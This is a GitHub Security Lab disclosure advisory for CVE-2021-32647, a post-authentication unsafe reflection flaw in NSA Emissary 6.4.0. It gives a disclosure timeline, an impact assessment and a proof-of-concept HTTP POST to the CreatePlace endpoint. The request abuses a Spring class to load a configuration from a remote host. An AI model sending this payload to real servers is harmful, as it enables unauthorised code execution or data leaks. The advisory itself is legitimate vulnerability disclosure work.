<header class="post-header d-block mb-6">
      <div class="date text-mono f5 my-3">July 16, 2021</div>
      <h1 class="my-2 h00-mktg lh-condensed">GHSL-2021-073: Post-authentication unsafe reflection in NSA Emissary - CVE-2021-32647</h1>

      
      
      
      
      

      

      <a target="_blank" class="sc-frDJqD SgxRc d-inline-flex flex-row flex-items-center text-gray" href="https://github.com/pwntester">
        <img class="mr-3" src="https://avatars.githubusercontent.com/u/125701?s=35" height="35" width="35">
        <span>Alvaro Munoz</span>
      </a>
    </header>

    <main id="content" class="markdown-body" aria-label="Content">
      
<h2 id="coordinated-disclosure-timeline">Coordinated Disclosure Timeline</h2>
<ul>
  <li>2021-04-27: Report sent to EmissarySupport@evoforge.org</li>
  <li>2021-05-28: <a href="https://github.com/NationalSecurityAgency/emissary/security/advisories/GHSA-ph73-7v9r-wg32">Advisory</a> is published</li>
</ul>

<h2 id="summary">Summary</h2>
<p>A logged-in user can invoke the constructor of some classes with untrusted data.</p>

<h2 id="product">Product</h2>
<p>National Security Agency Emissary</p>

<h2 id="tested-version">Tested Version</h2>
<p>6.4.0</p>

<h2 id="details">Details</h2>

<p>The <a href="https://github.com/NationalSecurityAgency/emissary/blob/30c54ef16c6eb6ed09604a929939fb9f66868382/src/main/java/emissary/server/mvc/internal/CreatePlaceAction.java#L36"><code class="language-plaintext highlighter-rouge">CreatePlace</code></a> REST endpoint accepts an <code class="language-plaintext highlighter-rouge">sppClassName</code> parameter which is used to load an arbitrary class. This class is later instantiated using a constructor with the following signature: <code class="language-plaintext highlighter-rouge">&lt;constructor&gt;(String, String, String)</code>. An attacker may find a gadget (class) in the application classpath that could be used to achieve Remote Code Execution (RCE) or disrupt the application.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /emissary/CreatePlace.action HTTP/1.1
Host: localhost:8001
x-requested-by: 
Content-Type: application/x-www-form-urlencoded
Content-Length: 142

sppClassName=org.springframework.context.support.FileSystemXmlApplicationContext&amp;sppLocation=bar.bar.bar.http%3A%2F%2Fbar.com&amp;sppDirectory=foo
</code></pre></div></div>

<h4 id="impact">Impact</h4>
<p>Even though the chances to find a gadget (class) that allow arbitrary code execution are low, an attacker can still find gadgets that could potentially crash the application or leak sensitive data.</p>

<h2 id="cve">CVE</h2>
<ul>
  <li>CVE-2021-32647</li>
</ul>

<h2 id="resources">Resources</h2>
<ul>
  <li><a href="https://github.com/NationalSecurityAgency/emissary/security/advisories/GHSA-ph73-7v9r-wg32">https://github.com/NationalSecurityAgency/emissary/security/advisories/GHSA-ph73-7v9r-wg32</a></li>
</ul>

<h2 id="credit">Credit</h2>
<p>This issue was discovered and reported by GHSL team member <a href="https://github.com/pwntester">@pwntester (Alvaro Muñoz)</a>.</p>

<h2 id="contact">Contact</h2>
<p>You can contact the GHSL team at <code class="language-plaintext highlighter-rouge">securitylab@github.com</code>, please include a reference to <code class="language-plaintext highlighter-rouge">GHSL-2021-073</code> in any communication regarding this issue.</p>


   